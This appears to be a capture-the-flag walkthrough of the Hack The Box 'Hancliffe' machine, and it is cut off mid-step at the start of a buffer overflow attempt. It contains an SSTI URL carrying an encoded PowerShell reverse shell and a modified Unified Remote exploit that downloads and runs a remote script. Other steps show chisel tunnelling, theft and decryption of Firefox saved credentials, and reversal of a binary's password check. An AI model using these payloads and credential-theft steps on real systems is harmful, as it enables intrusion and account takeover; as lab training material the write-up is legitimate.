    "text": "USER\n\nStep 1\nnmap:\n┌──(void㉿void)-[~]\n└─$ nmap -p- 10.10.11.115        \nPORT     STATE SERVICE\n80/tcp   open  http\n8000/tcp open  http-alt\n9999/tcp open  abyss\n\n┌──(void㉿void)-[~]\n└─$ nmap -p80,8000,9999 -sCV 10.10.11.115\nPORT     STATE SERVICE VERSION\n80/tcp   open  http    nginx 1.21.0\n|_http-server-header: nginx/1.21.0\n|_http-title: Welcome to nginx!\n8000/tcp open  http    nginx 1.21.0\n|_http-open-proxy: Proxy might be redirecting requests\n|_http-server-header: nginx/1.21.0\n|_http-title: HashPass | Open Source Stateless Password Manager\n9999/tcp open  abyss?\n| fingerprint-strings: \n|   DNSStatusRequestTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe: \n|     Welcome Brankas Application.\n|     Username: Password:\n|   NULL: \n|     Welcome Brankas Application.\n|_    Username:\ndirb:\nPORT 80:\n+ http://10.10.11.115/con (CODE:500|SIZE:494)\n+ http://10.10.11.115/index.html (CODE:200|SIZE:612)\n+ http://10.10.11.115/maintenance (CODE:302|SIZE:0)\n+ http://10.10.11.115/nul (CODE:500|SIZE:494)\n\nPORT 8000:\n==&gt; DIRECTORY: http://10.10.11.115:8000/assets/\n+ http://10.10.11.115:8000/con (CODE:500|SIZE:579)\n==&gt; DIRECTORY: http://10.10.11.115:8000/includes/\n+ http://10.10.11.115:8000/index.php (CODE:200|SIZE:7880)\n+ http://10.10.11.115:8000/license (CODE:200|SIZE:34501)\n+ http://10.10.11.115:8000/LICENSE (CODE:200|SIZE:34501)\n+ http://10.10.11.115:8000/nul (CODE:500|SIZE:579)\nnikto:\nPORT 80:\n+ Server: nginx/1.21.0\n+ /maintenance/: Admin login page/section found.\n\nPORT 8000:\n+ Server: nginx/1.21.0\n+ Retrieved x-powered-by header: PHP/8.0.7\nffuf:\nPORT 80:\nmaintenance             [Status: 302, Size: 0, Words: 1, Lines: 1]\n\nPORT 8000:\nN/A\nport 9999\n┌──(void㉿void)-[~]\n└─$ nc 10.10.11.115 9999\nWelcome Brankas Application.\nUsername: anonymous\nPassword: anonymous\nUsername or Password incorrect\nPORT 80: - Visiting http://10.10.11.115/maintenance/ -&gt; 302 Moved /nuxeo/Maintenance/ - Which is probably nuxeo web ui but unable to fuzz the directory\nPORT 8000: - http://10.10.11.115:8000/ is used for HashPass\n\n\n\nStep 2\nFrom our inital checks we found that GET requests on port 80 to /maintenance/ got 302 Moved to /nuxeo/Maintenance, which is interesting. Playing some more we find that ..\n.. GET /maintenance/..;/index.jsp -&gt; 302 Moved /nuxeo/nxstartup.faces\n.. GET /maintenance/..;/nuxeo/nxstartup.faces -&gt; 302 Moved /nuxeo/login.jsp\n.. GET /maintenance/..;/login.jsp -&gt; 200 Found\nWe have a login prompt, but no credentials. A quick google and the second result we find is a authentication bypass rce, which leverages SSTI.\nTo see if the target is vulnerable to SSTI we can use this simple test string:\n\nUsing revshell.com we generate a PowerShell #3 (Base64) shell as payload and trigger full SSTI RCE:\nhttp://10.10.11.115/maintenance/..;/login.jsp/pwn$%7B%22%22.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22powershell%20-e%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOAAiACwANAA0ADgAOAApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=%22,null).waitFor()%7D.xhtml\n┌──(void㉿void)-[/htb/hancliffe]\n└─$ rlwrap -cAr nc -lvnp 4488\nlistening on [any] 4488 ...\nconnect to [10.10.14.8] from (UNKNOWN) [10.10.11.115] 57150\nPS C:\\Nuxeo&gt; whoami\nhancliffe\\svc_account\n\n\n\nStep 3\nManually enumerating the machine and we find little to nothing.\n.. some SMTP (default?) credentials:\nPS C:\\Nuxeo\\conf\\Catalina\\localhost&gt; type nuxeo.xml\n[... snip ...]\n  &lt;Resource auth=\"Container\" name=\"Mail\" type=\"javax.mail.Session\" factory=\"org.nuxeo.ecm.platform.ec.notification.email.EmailResourceFactory\"\n    mail.from=\"noreply@nuxeo.com\"\n    mail.store.protocol=\"pop3\"\n    mail.pop3.host=\"localhost\"\n    mail.pop3.port=\"110\"\n    mail.pop3.user=\"anonymous\"\n    mail.pop3.password=\"secret\"\n    mail.transport.protocol=\"smtp\"\n    mail.smtp.host=\"localhost\"\n    mail.smtp.port=\"25\"\n  /&gt;\n.. a few database variables:\ntype pg_env.bat\n@ECHO OFF\nREM The script sets environment variables helpful for PostgreSQL\n\n@SET PATH=\"C:\\Program Files\\PostgreSQL\\9.6\\bin\";%PATH%\n@SET PGDATA=C:\\Program Files\\PostgreSQL\\9.6\\data\n@SET PGDATABASE=postgres\n@SET PGUSER=postgres\n@SET PGPORT=5432\n@SET PGLOCALEDIR=C:\\Program Files\\PostgreSQL\\9.6\\share\\locale\n.. and running netstat we see there are a lot more services running locally:\nPS C:\\&gt; netstat -ant\nActive Connections\n  Proto  Local Address          Foreign Address        State           PID\n  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       7100\n  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       896\n  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4\n  TCP    0.0.0.0:5040           0.0.0.0:0              LISTENING       552\n  TCP    0.0.0.0:5432           0.0.0.0:0              LISTENING       3284\n  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4\n  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING       7100\n  TCP    0.0.0.0:9510           0.0.0.0:0              LISTENING       4132\n  TCP    0.0.0.0:9512           0.0.0.0:0              LISTENING       4132\n  TCP    0.0.0.0:9952           0.0.0.0:0              LISTENING       2328\n  TCP    0.0.0.0:9999           0.0.0.0:0              LISTENING       2848\n  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4\n  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       676\n  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       516\n  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       1092\n  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1588\n  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       656\nUploading winPEAS.exe to C:\\Windows\\Temp gives nothing, probably defender or applocker blocking it. But C:\\Windows\\Tasks works just fine.\nPS C:\\Windows\\Tasks&gt; copy \\\\10.10.14.8\\share\\wp.exe .\nPS C:\\Windows\\Tasks&gt; dir\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----                             \n-a----        12/14/2021   1:29 AM        1927680 wp.exe\nInteresting output from WinPEAS:\n  Protocol   Local Address         Local Port    Remote Address        Remote Port     State             Process ID      Process Name\n  TCP        0.0.0.0               80            0.0.0.0               0               Listening         7100            C:\\nginx\\nginx.exe\n  TCP        0.0.0.0               135           0.0.0.0               0               Listening         896             svchost\n  TCP        0.0.0.0               445           0.0.0.0               0               Listening         4               System\n  TCP        0.0.0.0               5040          0.0.0.0               0               Listening         552             svchost\n  TCP        0.0.0.0               5432          0.0.0.0               0               Listening         3284            postgres\n  TCP        0.0.0.0               5985          0.0.0.0               0               Listening         4               System\n  TCP        0.0.0.0               8000          0.0.0.0               0               Listening         7100            C:\\nginx\\nginx.exe\n  TCP        0.0.0.0               9014          0.0.0.0               0               Listening         8116            MyFirstApp\n  TCP        0.0.0.0               9510          0.0.0.0               0               Listening         4132            RemoteServerWin\n  TCP        0.0.0.0               9512          0.0.0.0               0               Listening         4132            RemoteServerWin\n\n------------------------\n\n    RemoteServerWin(Unified Intents AB - RemoteServerWin)[C:\\Program Files (x86)\\Unified Remote 3\\RemoteServerWin.exe] - Autoload - No quotes and Space detected\n\n\n\nStep 4\nGoing through all output we find that port 9510 and 9512 (Unified Remote 3) sounds interesting.\n\n“Unified Remote is a software that lets you use your mobile phone (Android, iOS, or Windows Phone) to control every aspect of your computer: from handling your keyboard and mouse to managing files on your hard drive.”\n\n┌──(void㉿void)-[/htb/hancliffe]\n└─$ searchsploit \"unified remote 3\"                                                                                                                       1 ⨯\n---------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n Exploit Title                                                                                                              |  Path\n---------------------------------------------------------------------------------------------------------------------------- ---------------------------------\n[... snip ...]\nUnified Remote 3.9.0.2463 - Remote Code Execution                                                                           | windows/remote/49587.py\n---------------------------------------------------------------------------------------------------------------------------- ---------------------------------\nThere is a RCE vuln that sounds interesting. Use chisel to port forward, so we can interact with the port. I had A LOT of problems getting this to work, probably because the default embedded version of chisel (in Kali) did not match my windows binary version.\nSo smartest thing here is to download and compile new executables for both exe and elf.\n$ sudo git clone https://github.com/jpillora/chisel.git\n$ cd chisel\n\n$ sudo GOOS=windows GOARCH=amd64 go build -ldflags=\"-s -w\" .\n$ ls -al chisel.exe    \n-rwxr-xr-x  1 root root 8556032 Jan  5 13:29 chisel.exe\n\n$ sudo go build -ldflags=\"-s -w\" .\n$ ls -al chisel     \n-rwxr-xr-x 1 root root 8392704 Jan  5 13:31 chisel\nPS C:\\Windows\\Tasks&gt; copy \\\\10.10.14.3\\share\\chisel.exe .\nPS C:\\Windows\\Tasks&gt; dir\n\nMode                 LastWriteTime         Length Name                                                                 \n----                 -------------         ------ ----                                                                 \n-a----        12/14/2021   2:29 AM        8548352 chisel.exe                                                           \n\n\n┌──(void㉿void)-[/opt/chisel]\n└─$ ./chisel server -p 9000 --reverse\n\nPS C:\\Windows\\Tasks&gt; .\\chisel.exe client 10.10.14.3:9000 R:9512:localhost:9512\nReading through the Unified Remote RCE script we find that it wants three input arguments, and we need to host a HTTP server to download the payload.\n# User Specified arguments\ntry:\n    rhost = sys.argv[1]\n    lhost = sys.argv[2]\n    payload = sys.argv[3]\nexcept:\n\n[... snip ...]\n\n    print(\"[+] Opening CMD\")\n    SendString(\"cmd.exe\", rhost)\n    sleep(0.3)\n    SendReturn()\n    sleep(0.3)\n    print(\"[+] *Super Fast Hacker Typing*\")\n    SendString(\"certutil.exe -f -urlcache http://\" + lhost + \"/\" + payload + \" C:\\\\Windows\\\\Temp\\\\\" + payload, rhost) # Retrieve HTTP hosted payload\n    sleep(0.3)\n    print(\"[+] Downloading Payload\")\n    SendReturn()\n    sleep(3)\n    SendString(\"C:\\\\Windows\\\\Temp\\\\\" + payload, rhost) # Execute Payload\nI struggled with this part for a while but in the end modified my script to look like this:\n# User Specified arguments\ntry:\n    rhost = sys.argv[1]\n    lhost = sys.argv[2]\nexcept:\n\n\n[... snip ...]\n\n    print(\"[+] Opening CMD\")\n    SendString(\"powershell.exe\", rhost)\n    sleep(0.3)\n    SendReturn()\n    print(\"[+] Executing Payload\")\n    sleep(0.3)\n    SendString(\"IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/Invoke-PowerShellTcp.ps1')\", rhost) # Execute Payload\n    sleep(0.3)\n    SendReturn()\n    sleep(5)\n    print(\"[+] Done! Check listener?\")\nSetup a HTTP-sever, listener and execute the script\n┌──(void㉿void)-[/htb/hancliffe]\n└─$ python expl.py 127.0.0.1 10.10.14.3\n[+] Connecting to target...\n[+] Popping Start Menu\n[+] Opening CMD\n[+] Executing Payload\n[+] Done! Check listener?\n\n┌──(void㉿void)-[/htb/hancliffe]\n└─$ python3 -m http.server 8080\nServing HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...\n10.10.11.115 - - [05/Jan/2022 15:25:24] \"GET /invoke-powershelltcp.ps1 HTTP/1.1\" 200 -\n\n┌──(void㉿void)-[/htb/hancliffe]\n└─$ nc -lvnp 4499                                       \nlistening on [any] 4499 ...\nconnect to [10.10.14.3] from (UNKNOWN) [10.10.11.115] 62188\nWindows PowerShell running as user clara on HANCLIFFE\nCopyright (C) 2015 Microsoft Corporation. All rights reserved.\n\nPS C:\\Users\\clara&gt; type Desktop/user.txt\nfbcd97c3cb51969565dfe241c1149a62\n\n\n\n\nROOT\n\nStep 1\nAfter a lot of enumeration I came across the Mozilla Firefox profiles containing sensitive files logins.json, key4.db, cookies.sqlite and cert9.db.\nPS C:\\Users\\clara\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\ljftf853.default-release&gt; cat logins.json\n{\"nextId\":2,\"logins\":[{\"id\":1,\"hostname\":\"http://localhost:8000\",\"httpRealm\":null,\"formSubmitURL\":\"http://localhost:8000\",\"usernameField\":\"website\",\"passwordField\":\"masterpassword\",\"encryptedUsername\":\"MDoEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECP+7GREfh/OCBBACN8BqXSHhgvedk/ffsRBn\",\"encryptedPassword\":\"MFIEEPgAAAAAAAAAAAAAAAAAAAEwFAYIKoZIhvcNAwcECEQe5quezh5lBCg7VV7cXOky4tBMinRRncbXJl1YC3P0Ql5J8ZZS6ZnVjg9yXrbOq1Me\",\"guid\":\"{39d1884b-56cd-4e30-869b-e0d9df6ca9d9}\",\"encType\":1,\"timeCreated\":1624771259387,\"timeLastUsed\":1624771259387,\"timePasswordChanged\":1624771259387,\"timesUsed\":1}],\"potentiallyVulnerablePasswords\":[],\"dismissedBreachAlertsByLoginGUID\":{},\"version\":3}\nCopy the files from Windows to Kali using certutil -encode.\nPS C:\\Users\\clara\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\ljftf853.default-release&gt; certutil.exe -encode logins.json C:\\Windows\\Tasks\\logins.b64\nInput Length = 674\nOutput Length = 986\nCertUtil: -encode command completed successfully.\n\nPS C:\\Users\\clara\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\ljftf853.default-release&gt; type C:\\Windows\\Tasks\\logins.b64\n-----BEGIN CERTIFICATE-----\neyJuZXh0SWQiOjIsImxvZ2lucyI6W3siaWQiOjEsImhvc3RuYW1lIjoiaHR0cDov\nL2xvY2FsaG9zdDo4MDAwIiwiaHR0cFJlYWxtIjpudWxsLCJmb3JtU3VibWl0VVJM\nIjoiaHR0cDovL2xvY2FsaG9zdDo4MDAwIiwidXNlcm5hbWVGaWVsZCI6IndlYnNp\ndGUiLCJwYXNzd29yZEZpZWxkIjoibWFzdGVycGFzc3dvcmQiLCJlbmNyeXB0ZWRV\nc2VybmFtZSI6Ik1Eb0VFUGdBQUFBQUFBQUFBQUFBQUFBQUFBRXdGQVlJS29aSWh2\nY05Bd2NFQ1ArN0dSRWZoL09DQkJBQ044QnFYU0hoZ3ZlZGsvZmZzUkJuIiwiZW5j\ncnlwdGVkUGFzc3dvcmQiOiJNRklFRVBnQUFBQUFBQUFBQUFBQUFBQUFBQUV3RkFZ\nSUtvWklodmNOQXdjRUNFUWU1cXVlemg1bEJDZzdWVjdjWE9reTR0Qk1pblJSbmNi\nWEpsMVlDM1AwUWw1SjhaWlM2Wm5Wamc5eVhyYk9xMU1lIiwiZ3VpZCI6InszOWQx\nODg0Yi01NmNkLTRlMzAtODY5Yi1lMGQ5ZGY2Y2E5ZDl9IiwiZW5jVHlwZSI6MSwi\ndGltZUNyZWF0ZWQiOjE2MjQ3NzEyNTkzODcsInRpbWVMYXN0VXNlZCI6MTYyNDc3\nMTI1OTM4NywidGltZVBhc3N3b3JkQ2hhbmdlZCI6MTYyNDc3MTI1OTM4NywidGlt\nZXNVc2VkIjoxfV0sInBvdGVudGlhbGx5VnVsbmVyYWJsZVBhc3N3b3JkcyI6W10s\nImRpc21pc3NlZEJyZWFjaEFsZXJ0c0J5TG9naW5HVUlEIjp7fSwidmVyc2lvbiI6\nM30=\n-----END CERTIFICATE-----\nAnd decoding/pasting the file in Kali using base64 -d.\n┌──(void㉿void)-[/htb/hancliffe]\n└─$ echo \"eyJuZXh0SWQiOjIsImxvZ2lucyI6W3siaWQiOjEsImhvc3RuYW1lIjoiaHR0cDov\nL2xvY2FsaG9zdDo4MDAwIiwiaHR0cFJlYWxtIjpudWxsLCJmb3JtU3VibWl0VVJM\nIjoiaHR0cDovL2xvY2FsaG9zdDo4MDAwIiwidXNlcm5hbWVGaWVsZCI6IndlYnNp\ndGUiLCJwYXNzd29yZEZpZWxkIjoibWFzdGVycGFzc3dvcmQiLCJlbmNyeXB0ZWRV\nc2VybmFtZSI6Ik1Eb0VFUGdBQUFBQUFBQUFBQUFBQUFBQUFBRXdGQVlJS29aSWh2\nY05Bd2NFQ1ArN0dSRWZoL09DQkJBQ044QnFYU0hoZ3ZlZGsvZmZzUkJuIiwiZW5j\ncnlwdGVkUGFzc3dvcmQiOiJNRklFRVBnQUFBQUFBQUFBQUFBQUFBQUFBQUV3RkFZ\nSUtvWklodmNOQXdjRUNFUWU1cXVlemg1bEJDZzdWVjdjWE9reTR0Qk1pblJSbmNi\nWEpsMVlDM1AwUWw1SjhaWlM2Wm5Wamc5eVhyYk9xMU1lIiwiZ3VpZCI6InszOWQx\nODg0Yi01NmNkLTRlMzAtODY5Yi1lMGQ5ZGY2Y2E5ZDl9IiwiZW5jVHlwZSI6MSwi\ndGltZUNyZWF0ZWQiOjE2MjQ3NzEyNTkzODcsInRpbWVMYXN0VXNlZCI6MTYyNDc3\nMTI1OTM4NywidGltZVBhc3N3b3JkQ2hhbmdlZCI6MTYyNDc3MTI1OTM4NywidGlt\nZXNVc2VkIjoxfV0sInBvdGVudGlhbGx5VnVsbmVyYWJsZVBhc3N3b3JkcyI6W10s\nImRpc21pc3NlZEJyZWFjaEFsZXJ0c0J5TG9naW5HVUlEIjp7fSwidmVyc2lvbiI6\nM30=\" | base64 -d &gt; logins.json\nDo the same for the remaining files key4.db, cookies.sqlite and cert9.db. Save all files in a profile directory, and in the parent directory create profiles.ini file.\n┌──(void㉿void)-[/htb/hancliffe/firefox-loot]\n└─$ tree                 \n.\n├── ljftf853.default-release\n│   ├── cert9.db\n│   ├── cookies.sqlite\n│   ├── key4.db\n│   └── logins.json\n└── profiles.ini\n\n┌──(void㉿void)-[/htb/hancliffe/firefox-loot]\n└─$ cat profiles.ini            \n[Profile1]\nName=default\nIsRelative=1\nPath=ljftf853.default-release\nDefault=1\nDownload and run firefox_decrypt to extract the credentials.\n┌──(void㉿void)-[/opt/firefox_decrypt]\n└─$ ./firefox_decrypt.py /htb/hancliffe/firefox-loot            \n\nWebsite:   http://localhost:8000\nUsername: 'hancliffe.htb'\nPassword: '#@H@ncLiff3D3velopm3ntM@st3rK3y*!'\n\n\n\nStep 2\nTo understand what the firefox_decrypt output actually means we can have a closer look into the file logins.json. * \"hostname\":\"http://localhost:8000\" - \"usernameField\":\"website\" - \"passwordField\":\"masterpassword\"\nFrom this we are missing one input parameter from the Stageless Password Manager on port 8000, Full Name. Looking on the password (#@H@ncLiff3D3velopm3ntM@st3rK3y*!) and in C:\\Users\\ we can guess that it belongs to user development. Using all found parameters we get the generated password AMl.q2DHp?2.C/V0kNFU.\n\nTrying to change user with the standard PS ScriptBlock gives no output:\n$user = 'development'\n$pass = 'AMl.q2DHp?2.C/V0kNFU' | ConvertTo-SecureString -AsPlainText -Force\n$creds = New-Object System.Management.Automation.PSCredential($user,$pass)\nInvoke-Command -ComputerName localhost -Credential $creds -ScriptBlock { whoami }\nNor does the credentials work for the service on port 9999:\n┌──(void㉿void)-[/htb/hancliffe]\n└─$ nc hancliffe.htb 9999                                               127 ⨯\nWelcome Brankas Application.\nUsername: development\nPassword: AMl.q2DHp?2.C/V0kNFU\nUsername or Password incorrect\nThis threw me off guard for a while, before I went back to look on my enumerated data and saw that port 5985 is open locally.\n┌──(void㉿void)-[/opt/chisel]\n└─$ ./chisel server -p 9000 --reverse\n2022/01/07 10:40:26 server: Reverse tunnelling enabled\n2022/01/07 10:40:26 server: Fingerprint N5yEuHLOYJ6FFzk6vpDu7Pi1M2815GcnvXEo7BGBhT0=\n2022/01/07 10:40:26 server: Listening on http://0.0.0.0:9000\n2022/01/07 10:40:29 server: session#1: tun: proxy#R:5985=&gt;localhost:5985: Listening\nPS C:\\Windows\\Tasks&gt; .\\chisel.exe client 10.10.14.8:9000 R:5985:localhost:5985\n┌──(void㉿void)-[/htb/hancliffe]\n└─$ evil-winrm -i localhost -u development -p \"AMl.q2DHp?2.C/V0kNFU\"                                                                                      1 ⨯\n\n*Evil-WinRM* PS C:\\Users\\development\\Documents&gt; whoami\nhancliffe\\development\n\n\n\nStep 3\nNext step is pretty obvious, we need to break the application on port 9999 some how to gain a root shell. And looking in C:\\DevApp we find the source:\n*Evil-WinRM* PS C:\\DevApp&gt; ls\n\nMode                 LastWriteTime         Length Name\n----                 -------------         ------ ----\n-a----         9/14/2021   5:02 AM          60026 MyFirstApp.exe\n-a----         9/14/2021  10:57 AM            636 restart.ps1\n\n*Evil-WinRM* PS C:\\DevApp&gt; cat restart.ps1\n# Restart app every 3 mins to avoid crashes\nwhile($true) {\n  # Delete existing forwards\n  cmd /c \"netsh interface portproxy delete v4tov4 listenport=9999 listenaddress=0.0.0.0\"\n  # Spawn app\n  $proc = Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList (\"C:\\DevApp\\MyFirstApp.exe\")\n  sleep 2\n  # Get random port\n  $port = (Get-NetTCPConnection -OwningProcess $proc.ProcessId).LocalPort\n  # Forward port to 9999\n  cmd /c \"netsh interface portproxy add v4tov4 listenport=9999 listenaddress=0.0.0.0 connectport=$port connectaddress=127.0.0.1\"\n  sleep 180\n  # Kill and repeat\n  taskkill /f /t /im MyFirstApp.exe\n}\nDownload MyFirstApp.exe and start analyze it! In Ghidra we find a few interesting things..\n.. a login function containing username and a base64 encoded password in clear text \n.. encryption function encrypt1\n\n.. encryption function encrypt2\n\nWorking our way backwards with the login function we can see that..\n.. line 23, enc2_len is the lenght (17) of the base64 DECODED b64pass variable\n┌──(void㉿void)-[/htb/hancliffe]\n└─$ echo \"YXlYeDtsbD98eDtsWms5SyU=\" | base64 -d | wc -c\n17\n.. line 22, local_20 get the data from enc2Data\n┌──(void㉿void)-[/htb/hancliffe]\n└─$ echo \"YXlYeDtsbD98eDtsWms5SyU=\" | base64 -d        \nayXx;ll?|x;lZk9K%\nTrying to understand the functions to 100% I decided to replicate the code in Python. After being stuck for a good while I got a hint, the password to the executable is K3r4j@@nM4j@pAh!T. With this we know that after running the password through the encryption algorithms, we should ge the product ayXx;ll?|x;lZk9K%, which is a huge guidance.\nWith encryption knowledge you should/could have picked up that enc1 is actually just ROT47 and enc2 Atbash cipher and instantly solve this issue with CyberChef. I did not know this..\nAfter days of troubleshooting I finally was finally able to find a massive error, from Ghidra. In the disasembly 0x61 was some how translated to 0x9f in the code, making all my calculation incorrenct. \nAfter fixing this I was able to replicate the encryption algorithms.\n[root:/git/htb/hancliffe]# cat enc.py                                                                                              (master✱) \n#!/usr/bin/python3\nimport binascii\n\npw = \"K3r4j@@nM4j@pAh!T\"\nsize = len(pw)\n\n#enc1_pw = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16]\nenc1_pw = [\"K\",\"3\",\"r\",\"4\",\"j\",\"@\",\"@\",\"n\",\"M\",\"4\",\"j\",\"@\",\"p\",\"A\",\"h\",\"!\",\"T\"]\nprint(\"==== ENCRYPTION 1 ====\")\nfor i in range(size):\n    #print(\"ENC1_PW:\", enc1_pw[i], ord(enc1_pw[i]))\n    \n    if ((32 &lt; ord(enc1_pw[i])) and (ord(enc1_pw[i]) != 127)):\n        holder = ord(enc1_pw[i]) + 47\n        #print(\"IF1:\", pw[i], ord(pw[i]), holder)\n        \n        if (ord(enc1_pw[i]) + 47 &lt; 127):\n            enc1_pw[i] = holder\n            #print(\"IF2:\", enc1_pw[i])\n        \n        else:\n            enc1_pw[i] = holder - 94\n            #print(\"ELSE:\", enc1_pw[i])\n\nprint(\"ENC1:\", enc1_pw)\n\nprint(\"\\n==== ENCRYPTION 2 ====\")\n\nenc2_pw = enc1_pw\nfor i in range(size):\n    holder2 = enc1_pw[i]\n    #print(\"HOLDER2:\", holder2)\n    if ((holder2 &lt; 65) or (90 &lt; holder2 and holder2 &lt; 97) or (122 &lt; holder2)):\n        enc2_pw[i] = holder2\n        #print(\"IF1:\", holder2)\n    else:\n        var2 = holder2 &lt; 91\n        if (var2):\n            holder2 = holder2 + 32\n            #print(\"IF2:\", holder2)\n        \n        enc2_pw[i] = ord(\"z\") - (holder2 - 97)\n\n        if (var2):\n            enc2_pw[i] = enc2_pw[i] - 32\n\nprint(\"ENC2:\", enc2_pw)\nprint(\"CORR: [97, 121, 88, 120, 59, 108, 108, 63, 124, 120, 59, 108, 90, 107, 57, 75, 37]\")\n[root:/git/htb/hancliffe]# ./enc.py\n==== ENCRYPTION 1 ====\nENC1: [122, 98, 67, 99, 59, 111, 111, 63, 124, 99, 59, 111, 65, 112, 57, 80, 37]\n\n==== ENCRYPTION 2 ====\nENC2: [97, 121, 88, 120, 59, 108, 108, 63, 124, 120, 59, 108, 90, 107, 57, 75, 37]\nCORR: [97, 121, 88, 120, 59, 108, 108, 63, 124, 120, 59, 108, 90, 107, 57, 75, 37]\nLooking for strings in the binary we find a few more interesting lines that might be usefull later.\n\n\n\n\nStep 4\nWith a deeper understanding of the binary we can simply reverse it by changing the orders of enc1 and enc2.\n[root:/git/htb/hancliffe]# cat dec.py                                                                                              (master✱) \n#!/usr/bin/python3\nimport base64\n\n#b64pw = \"YXlYeDtsbD98eDtsWms5SyU=\"\nb64pw = input(\"Enter Base64 to Reverse: \")\ndecode = base64.b64decode(b64pw)\nenc2_pw = [chr(p) for p in decode]\n\nfor i in range (len(enc2_pw)):\n    holder2 = ord(enc2_pw[i])\n    if ((holder2 &lt; 65) or (90 &lt; holder2 and holder2 &lt; 97) or (122 &lt; holder2)):\n        enc2_pw[i] = holder2\n    else:\n        var2 = holder2 &lt; 91\n        if (var2):\n            holder2 = holder2 + 32\n        enc2_pw[i] = ord(\"z\") - (holder2 - 97)\n        if (var2):\n            enc2_pw[i] = enc2_pw[i] - 32\n\nenc1_pw = enc2_pw\nfor i in range (len(enc2_pw)):\n    if ((32 &lt; enc1_pw[i]) and (enc1_pw[i] != 127)):\n        holder = enc1_pw[i] + 47\n        if (enc1_pw[i] + 47 &lt; 127):\n            enc1_pw[i] = holder\n        else:\n            enc1_pw[i] = holder - 94\n\npassword = [chr(x) for x in enc1_pw]\nprint(\"Password: \", *password, sep='')\n[root:/git/htb/hancliffe]# ./dec.py\nEnter Base64 to Reverse: YXlYeDtsbD98eDtsWms5SyU=\nPassword: K3r4j@@nM4j@pAh!T\nRunning the application we can use the FullName and Code we found from the strings. The application unlocks but closes directly. Maybe it is at this point we should break the application through any of the other input variables.\n[root:/git/htb/hancliffe]# nc 10.10.11.115 9999\nWelcome Brankas Application.\nUsername: alfiansyah\nPassword: K3r4j@@nM4j@pAh!T\nLogin Successfully!\nFullName: Vickry Alfiansyah\nInput Your Code: T3D83CbJkl1299\nUnlocked\n\n\n\nStep 5\nPlaying around with the application (locally) it seems that it’s vulnerable to buffer overflow in the Code input variable.\n[root:/git/htb/hancliffe]# nc 172.30.1.118 9449\nWelcome Brankas Application.\nUsername: alfiansyah\nPassword: K3r4j@@nM4j@pAh!T\nLogin Successfully!\nFullName: asdf\nInput Your Code: 